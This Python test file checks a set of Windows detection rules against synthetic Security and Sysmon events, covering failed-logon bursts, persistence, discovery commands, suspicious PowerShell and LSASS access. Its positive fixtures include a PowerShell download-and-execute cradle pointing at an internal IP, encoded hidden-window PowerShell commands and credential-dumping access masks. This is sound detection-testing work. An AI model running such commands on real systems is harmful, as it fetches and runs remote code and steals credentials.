"""T3.2: every detection rule, positive and benign.

Every fixture here is hand-written: no corpus, no EVTX. Each rule gets at least one positive
test and at least one benign-lookalike test, plus the boundary cases the thresholds imply
(exactly-at-the-window, one-below-the-threshold, one-distinct-binary-short). Nothing here
asserts anything about real data.
"""

from __future__ import annotations

from collections.abc import Sequence

import pytest

from m2.detection.rules import (
    DISCOVERY_WINDOW_SECONDS,
    FAILED_LOGON_WINDOW_SECONDS,
    RULES,
    Rule,
)
from m2.detection.schema import Detection
from m2.schema import NormalisedEvent
from m2.tests.synthetic import SECURITY, SYSMON, make_event
from m2.timeutil import TICKS_PER_SECOND, iso_to_ticks, ticks_to_iso

SCENARIO = "SYN-B"
BASE = iso_to_ticks("2026-09-21T02:05:30.0000000Z")

WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXPLORER = "C:\\Windows\\explorer.exe"
CMD = "C:\\Windows\\System32\\cmd.exe"
POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def at(seconds: int) -> str:
    return ticks_to_iso(BASE + seconds * TICKS_PER_SECOND)


def _event(
    record_id: int,
    event_id: int,
    *,
    seconds: int = 0,
    channel: str = SECURITY,
    user: str | None = "alice",
    host: str | None = "LAB-A",
    event_data: dict[str, str] | None = None,
) -> NormalisedEvent:
    return make_event(
        scenario_id=SCENARIO,
        record_id=record_id,
        event_id=event_id,
        channel=channel,
        timestamp_ticks=BASE + seconds * TICKS_PER_SECOND,
        user=user,
        host=host,
        event_data={} if event_data is None else event_data,
    )


def _auth(record_id: int, event_id: int, seconds: int, *, user: str = "alice", host: str = "LAB-A") -> NormalisedEvent:
    return _event(record_id, event_id, seconds=seconds, user=user, host=host, event_data={"TargetUserName": user})


def _proc(
    record_id: int,
    seconds: int,
    *,
    image: str,
    parent: str = EXPLORER,
    command_line: str | None = None,
    channel: str = SECURITY,
    user: str = "alice",
    host: str = "LAB-A",
) -> NormalisedEvent:
    if channel == SECURITY:
        data = {"NewProcessName": image, "ParentProcessName": parent}
    else:
        data = {"Image": image, "ParentImage": parent, "User": user}
    if command_line is not None:
        data["CommandLine"] = command_line
    return _event(
        record_id,
        4688 if channel == SECURITY else 1,
        seconds=seconds,
        channel=channel,
        user=user,
        host=host,
        event_data=data,
    )


def _sysmon(record_id: int, event_id: int, seconds: int, *, event_data: dict[str, str]) -> NormalisedEvent:
    return _event(record_id, event_id, seconds=seconds, channel=SYSMON, event_data=event_data)


def run_rule(rule_id: str, events: Sequence[NormalisedEvent]) -> tuple[Detection, ...]:
    rule = next(candidate for candidate in RULES if candidate.spec.rule_id == rule_id)
    return rule.fn(tuple(events))


# --- the catalogue itself -----------------------------------------------------------


def test_the_rule_catalogue_is_sorted_unique_and_fully_specified():
    ids = [rule.spec.rule_id for rule in RULES]
    assert ids == sorted(ids)
    assert len(set(ids)) == len(ids)
    assert ids == [
        "R-AUTH-01",
        "R-AUTH-02",
        "R-AUTH-03",
        "R-CRED-01",
        "R-EXEC-01",
        "R-EXEC-02",
        "R-EXEC-03",
        "R-FILE-01",
        "R-LOG-01",
        "R-PERSIST-01",
        "R-PERSIST-02",
        "R-PERSIST-03",
    ]
    for rule in RULES:
        assert rule.spec.version == "1"
        assert rule.spec.description
        assert rule.spec.severity in ("low", "medium", "high")
        assert rule.spec.record().rule_id == rule.spec.rule_id
        assert rule.spec.record().params == rule.spec.params


def test_every_rule_is_a_pure_order_independent_function_of_its_events():
    events = ordinary_activity()
    snapshot = list(events)
    for rule in RULES:
        forward = rule.fn(tuple(events))
        assert rule.fn(tuple(reversed(events))) == forward
        assert rule.fn(tuple(events)) == forward
        assert list(events) == snapshot


def ordinary_activity() -> tuple[NormalisedEvent, ...]:
    """A day of nothing suspicious, which no rule may fire on."""
    return (
        _auth(1, 4624, 0),
        _auth(2, 4624, 60, user="bob"),
        _auth(3, 4625, 120, user="carol"),  # one failure is not a burst
        _proc(4, 10, image=EXPLORER),
        _proc(5, 20, image="C:\\Windows\\System32\\svchost.exe"),
        _proc(6, 30, image=CMD, parent=EXPLORER),
        _sysmon(
            7,
            40,
            10,
            event_data={"TargetImage": CMD, "GrantedAccess": "0x001000", "SourceImage": EXPLORER},
        ),
        _sysmon(8, 50, 11, event_data={"TargetFilename": "C:\\Windows\\System32\\driver.dll", "Image": EXPLORER}),
        _sysmon(
            9,
            60,
            13,
            event_data={"TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "EventType": "SetValue"},
        ),
    )


def test_nothing_fires_on_ordinary_activity():
    for rule in RULES:
        assert rule.fn(ordinary_activity()) == (), rule.spec.rule_id


# --- R-AUTH-01 / R-AUTH-02 ---------------------------------------------------------


def test_a_burst_then_success_is_one_high_detection_with_every_trigger():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 30)]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    detection = detections[0]
    assert detection.detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-1"
    assert detection.trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    assert (detection.window_start_utc, detection.window_end_utc) == (at(0), at(30))
    assert (detection.severity, detection.attack_technique) == ("high", "T1110")
    assert "3 failed logons" in detection.rationale


def test_two_failures_then_a_success_is_not_a_burst():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4624, 20)]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_burst_split_across_accounts_or_hosts_does_not_fire():
    events = [
        _auth(1, 4625, 0, user="alice"),
        _auth(2, 4625, 5, user="bob"),
        _auth(3, 4625, 10, user="carol"),
        _auth(4, 4624, 20, user="alice"),
        _auth(5, 4625, 25, user="alice", host="LAB-B"),
        _auth(6, 4625, 26, user="alice", host="LAB-C"),
    ]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_burst_without_a_success_is_medium_and_uses_only_the_failures():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 21, user="bob")]
    detections = run_rule("R-AUTH-02", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    assert detections[0].severity == "medium"


def test_the_two_failed_logon_rules_partition_a_burst():
    with_success = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 30)]
    without_success = [event for event in with_success if event.source_event_id == 4625]
    assert len(run_rule("R-AUTH-01", with_success)) == 1
    assert run_rule("R-AUTH-02", with_success) == ()
    assert run_rule("R-AUTH-01", without_success) == ()
    assert len(run_rule("R-AUTH-02", without_success)) == 1


def test_a_success_outside_the_burst_window_does_not_confirm_it():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 20 + 301)]
    assert run_rule("R-AUTH-01", events) == ()
    assert len(run_rule("R-AUTH-02", events)) == 1


def test_the_failed_logon_window_includes_its_last_tick_and_no_more():
    inside = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, FAILED_LOGON_WINDOW_SECONDS)]
    assert len(run_rule("R-AUTH-02", inside)) == 1
    outside = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, FAILED_LOGON_WINDOW_SECONDS + 1)]
    assert run_rule("R-AUTH-02", outside) == ()


def test_two_separate_bursts_are_two_detections():
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4625, 600),
        _auth(5, 4625, 610),
        _auth(6, 4625, 620),
    ]
    detections = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3"),
        ("SYN-B-SEC-4", "SYN-B-SEC-5", "SYN-B-SEC-6"),
    ]
    assert len({detection.detection_id for detection in detections}) == 2


# --- R-AUTH-03 ---------------------------------------------------------------------


def test_every_explicit_credential_logon_is_a_low_detection():
    events = [_auth(1, 4648, 0), _auth(2, 4648, 30, user="bob"), _auth(3, 4624, 60)]
    detections = run_rule("R-AUTH-03", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SEC-1",), ("SYN-B-SEC-2",)]
    assert {detection.severity for detection in detections} == {"low"}
    assert {detection.attack_technique for detection in detections} == {"T1078"}


def test_an_ordinary_interactive_logon_is_not_an_explicit_credential_logon():
    assert run_rule("R-AUTH-03", [_auth(1, 4624, 0)]) == ()


# --- R-LOG-01 ----------------------------------------------------------------------


def test_a_cleared_audit_log_is_a_high_detection():
    events = [_event(1, 1102, user=None, host="LAB-A", event_data={}), _auth(2, 4624, 5)]
    detections = run_rule("R-LOG-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)
    assert (detections[0].severity, detections[0].attack_technique) == ("high", "T1070.001")


def test_a_normal_event_is_not_a_cleared_audit_log():
    assert run_rule("R-LOG-01", [_auth(1, 4624, 0), _proc(2, 5, image=CMD)]) == ()


# --- R-PERSIST-01 / R-PERSIST-02 ---------------------------------------------------


def test_a_service_install_is_a_medium_detection():
    events = [_event(1, 4697, event_data={"ServiceName": "EvilSvc", "ServiceFileName": "C:\\evil.exe"})]
    detections = run_rule("R-PERSIST-01", events)
    assert len(detections) == 1
    assert "EvilSvc" in detections[0].rationale
    assert detections[0].attack_technique == "T1543.003"


def test_a_service_install_is_not_matched_off_the_security_channel():
    # 7045 is a System-channel ID; this corpus has no System channel, so nothing may match it.
    events = [
        _event(1, 7045, event_data={"ServiceName": "Suspicious"}),
        _event(2, 4698, event_data={"TaskName": "\\Evil"}),
    ]
    assert run_rule("R-PERSIST-01", events) == ()


def test_a_scheduled_task_creation_is_a_medium_detection():
    events = [_event(1, 4698, event_data={"TaskName": "\\Microsoft\\Evil"}), _event(2, 4697, event_data={})]
    detections = run_rule("R-PERSIST-02", events)
    assert len(detections) == 1
    assert detections[0].detection_id == "SYN-B-R-PERSIST-02-SYN-B-SEC-1"
    assert detections[0].attack_technique == "T1053.005"


def test_a_service_install_is_not_a_scheduled_task():
    assert run_rule("R-PERSIST-02", [_event(1, 4697, event_data={})]) == ()


# --- R-PERSIST-03 ------------------------------------------------------------------


def test_a_run_key_value_is_a_medium_detection():
    events = [
        _sysmon(
            1,
            13,
            0,
            event_data={
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "EventType": "SetValue",
            },
        ),
        _sysmon(
            2,
            13,
            5,
            event_data={
                "TargetObject": "HKU\\S-1-5-21-1-2-3-500\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Once",
                "EventType": "SetValue",
            },
        ),
    ]
    detections = run_rule("R-PERSIST-03", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SYS-1",), ("SYN-B-SYS-2",)]
    assert {detection.attack_technique for detection in detections} == {"T1547.001"}


def test_a_lookalike_run_key_or_another_registry_event_does_not_fire():
    events = [
        _sysmon(
            1,
            13,
            0,
            event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\X"},
        ),
        _sysmon(
            2,
            13,
            5,
            event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunSomething\\X"},
        ),
        _sysmon(
            3,
            13,
            10,
            event_data={"TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Hostname"},
        ),
        _sysmon(
            4,
            11,
            15,
            event_data={"TargetFilename": "C:\\Users\\alice\\AppData\\Local\\Temp\\x.exe"},
        ),
    ]
    assert run_rule("R-PERSIST-03", events) == ()


# --- R-EXEC-01 ---------------------------------------------------------------------


def test_three_distinct_discovery_binaries_in_a_window_are_one_medium_burst():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 5, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, 10, image="C:\\Windows\\System32\\ipconfig.exe"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    assert detections[0].severity == "medium"
    assert "whoami" in detections[0].rationale


def test_a_single_discovery_binary_is_a_low_detection():
    detections = run_rule("R-EXEC-01", [_proc(1, 0, image="C:\\Windows\\System32\\whoami.exe")])
    assert len(detections) == 1
    assert detections[0].severity == "low"
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)


def test_two_distinct_binaries_are_not_a_burst():
    events = [_proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"), _proc(2, 5, image="C:\\Windows\\System32\\net.exe")]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low"]


def test_the_same_binary_repeated_is_not_a_burst():
    events = [_proc(record, record * 5, image="C:\\Windows\\System32\\whoami.exe") for record in (1, 2, 3)]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low", "low"]


def test_a_burst_must_fit_inside_the_window():
    inside = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, DISCOVERY_WINDOW_SECONDS, image="C:\\Windows\\System32\\route.exe"),
    ]
    assert len(run_rule("R-EXEC-01", inside)) == 1
    outside = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, DISCOVERY_WINDOW_SECONDS + 1, image="C:\\Windows\\System32\\route.exe"),
    ]
    assert [detection.severity for detection in run_rule("R-EXEC-01", outside)] == ["low", "low", "low"]


def test_a_burst_does_not_span_two_accounts():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe", user="alice"),
        _proc(2, 1, image="C:\\Windows\\System32\\net.exe", user="bob"),
        _proc(3, 2, image="C:\\Windows\\System32\\route.exe", user="carol"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low", "low"]


def test_an_ordinary_binary_is_not_discovery_telemetry():
    events = [_proc(1, 0, image="C:\\Windows\\System32\\svchost.exe"), _proc(2, 1, image=CMD)]
    assert run_rule("R-EXEC-01", events) == ()


def test_sysmon_process_creation_can_also_supply_discovery_events():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe", channel=SYSMON),
        _proc(2, 1, image="C:\\Windows\\System32\\net1.exe", channel=SYSMON),
        _proc(3, 2, image="C:\\Windows\\System32\\nltest.exe", channel=SYSMON),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SYS-1", "SYN-B-SYS-2", "SYN-B-SYS-3")


# --- R-EXEC-02 ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "command_line",
    (
        "powershell.exe -enc SQBFAFgA",
        "powershell.exe -EncodedCommand SQBFAFgA",
        'powershell.exe -nop -w hidden -Command "Get-Date"',
        "powershell.exe -WindowStyle Hidden -Command Get-Date",
        "powershell.exe -Command [System.Convert]::FromBase64String($x)",
        "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a')",
        "pwsh.exe -enc SQBFAFgA",
    ),
)
def test_a_marked_powershell_command_line_is_a_high_detection(command_line: str):
    event = _proc(1, 0, image=POWERSHELL, command_line=command_line)
    detections = run_rule("R-EXEC-02", [event])
    assert len(detections) == 1
    assert detections[0].severity == "high"
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)


@pytest.mark.parametrize(
    "command_line",
    (
        "powershell.exe -File script.ps1",
        "powershell.exe -Encoding UTF8 -File script.ps1",
        "powershell.exe -ExecutionPolicy Bypass -File deploy.ps1",
        "powershell.exe -Command Get-ChildItem -Path C:\\Windows",
        "cmd.exe /c ipconfig /all",
        "net.exe use \\\\server\\share",
    ),
)
def test_an_ordinary_command_line_does_not_fire_the_powershell_rule(command_line: str):
    event = _proc(1, 0, image=POWERSHELL, command_line=command_line)
    assert run_rule("R-EXEC-02", [event]) == ()


def test_a_non_process_event_with_a_marked_command_line_is_ignored():
    event = _auth(1, 4624, 0)
    event = event.model_copy(update={"event_data": {"CommandLine": "powershell.exe -enc SQBFAFgA"}})
    assert run_rule("R-EXEC-02", [event]) == ()


def test_the_marked_command_line_must_be_powershell():
    events = [_proc(1, 0, image=CMD, command_line="cmd.exe /c tool.exe -enc abc")]
    assert run_rule("R-EXEC-02", events) == ()


# --- R-EXEC-03 ---------------------------------------------------------------------


def test_a_document_host_spawning_a_shell_is_a_high_detection():
    event = _proc(1, 0, image=CMD, parent=WINWORD)
    detections = run_rule("R-EXEC-03", [event])
    assert len(detections) == 1
    assert detections[0].severity == "high"
    assert "WINWORD.EXE" in detections[0].rationale


def test_a_wmi_host_spawning_a_script_engine_is_a_detection():
    event = _proc(
        1,
        0,
        image="C:\\Windows\\System32\\WScript.exe",
        parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    )
    assert len(run_rule("R-EXEC-03", [event])) == 1


def test_sysmon_process_creation_supplies_parent_and_child_images():
    event = _proc(1, 0, image="C:\\Windows\\System32\\regsvr32.exe", parent=WINWORD, channel=SYSMON)
    assert len(run_rule("R-EXEC-03", [event])) == 1


@pytest.mark.parametrize(
    ("parent", "child"),
    (
        (EXPLORER, CMD),
        (WINWORD, EXPLORER),
        (CMD, POWERSHELL),
        ("C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\svchost.exe"),
    ),
)
def test_an_ordinary_parent_child_pair_does_not_fire(parent: str, child: str):
    assert run_rule("R-EXEC-03", [_proc(1, 0, image=child, parent=parent)]) == ()


# --- R-CRED-01 ---------------------------------------------------------------------


def test_a_documented_suspicious_mask_against_lsass_is_a_high_detection():
    events = [
        _sysmon(1, 10, 0, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x001410"}),
        _sysmon(
            2,
            10,
            5,
            event_data={
                "TargetImage": "C:\\Windows\\System32\\LSASS.EXE",
                "GrantedAccess": "0x001FFFFF",
            },
        ),
    ]
    detections = run_rule("R-CRED-01", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SYS-1",), ("SYN-B-SYS-2",)]
    assert {detection.severity for detection in detections} == {"high"}
    assert {detection.attack_technique for detection in detections} == {"T1003.001"}


@pytest.mark.parametrize(
    "event_data",
    (
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x001000"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x00000010"},
        {"TargetImage": "C:\\Windows\\System32\\notepad.exe", "GrantedAccess": "0x001FFFFF"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0xZZZZ"},
        {"TargetImage": "C:\\Windows\\System32\\lsass.exe"},
    ),
)
def test_a_benign_or_unparseable_process_access_is_not_a_credential_theft_hit(event_data: dict[str, str]):
    assert run_rule("R-CRED-01", [_sysmon(1, 10, 0, event_data=event_data)]) == ()


def test_a_security_event_that_mimics_process_access_does_not_fire():
    events = [_event(1, 4688, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"})]
    assert run_rule("R-CRED-01", events) == ()


# --- R-FILE-01 ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    (
        "C:\\Users\\alice\\AppData\\Local\\Temp\\evil.exe",
        "C:\\Users\\alice\\AppData\\Roaming\\payload.dll",
        "C:\\Users\\bob\\Downloads\\invoice.ps1",
        "C:\\Windows\\Temp\\stage.bat",
        "C:\\ProgramData\\tools\\update.vbs",
        "C:\\Users\\alice\\AppData\\Local\\Temp\\helper.js",
    ),
)
def test_an_executable_written_to_a_user_writable_location_is_a_detection(target: str):
    detections = run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"TargetFilename": target})])
    assert len(detections) == 1
    assert detections[0].severity == "medium"
    assert detections[0].attack_technique == "T1105"


@pytest.mark.parametrize(
    "target",
    (
        "C:\\Windows\\System32\\driver.dll",
        "C:\\Windows\\Temp\\notes.txt",
        "C:\\Users\\alice\\Documents\\report.exe",
        "C:\\Users\\alice\\AppData\\Local\\Temp\\archive.zip",
        "C:\\ProgramData\\Microsoft\\Windows Defender\\Definitions\\mpasbase.vdm",
    ),
)
def test_an_ordinary_file_creation_is_not_a_drop(target: str):
    assert run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"TargetFilename": target})]) == ()


def test_a_missing_target_filename_does_not_fire():
    assert run_rule("R-FILE-01", [_sysmon(1, 11, 0, event_data={"Image": EXPLORER})]) == ()


# --- cross-rule properties ---------------------------------------------------------


def every_suspicious_event() -> tuple[NormalisedEvent, ...]:
    return (
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4624, 30),
        _auth(5, 4648, 40),
        _event(6, 1102, user=None, event_data={}),
        _event(7, 4697, event_data={"ServiceName": "EvilSvc"}),
        _event(8, 4698, event_data={"TaskName": "\\Evil"}),
        _sysmon(9, 13, 50, event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\X"}),
        _proc(10, 60, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(11, 61, image="C:\\Windows\\System32\\net.exe"),
        _proc(12, 62, image="C:\\Windows\\System32\\tasklist.exe"),
        _proc(13, 70, image=POWERSHELL, command_line="powershell.exe -enc SQBFAFgA"),
        _proc(14, 80, image=CMD, parent=WINWORD),
        _sysmon(15, 10, 90, event_data={"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}),
        _sysmon(16, 11, 100, event_data={"TargetFilename": "C:\\Windows\\Temp\\stage.exe"}),
        # A second burst for another account, with no successful logon after it (R-AUTH-02).
        _auth(17, 4625, 200, user="bob"),
        _auth(18, 4625, 205, user="bob"),
        _auth(19, 4625, 210, user="bob"),
    )


def test_the_whole_catalogue_gives_unique_ids_and_a_trigger_per_detection():
    detections = [detection for rule in RULES for detection in rule.fn(every_suspicious_event())]
    ids = [detection.detection_id for detection in detections]
    assert len(set(ids)) == len(ids)
    assert len(detections) >= len(RULES)
    for detection in detections:
        assert detection.scenario_id == SCENARIO
        assert detection.trigger_evidence_ids
        assert detection.rule_id in {rule.spec.rule_id for rule in RULES}
        assert detection.rationale
        assert detection.rule_version == "1"
    # And no rule fires on the empty scenario.
    for rule in RULES:
        assert rule.fn(()) == (), rule.spec.rule_id


def test_rules_never_fire_twice_on_the_same_trigger_event():
    for rule in RULES:
        detections = rule.fn(every_suspicious_event())
        triggers = [evidence_id for detection in detections for evidence_id in detection.trigger_evidence_ids]
        assert len(triggers) == len(set(triggers)), rule.spec.rule_id
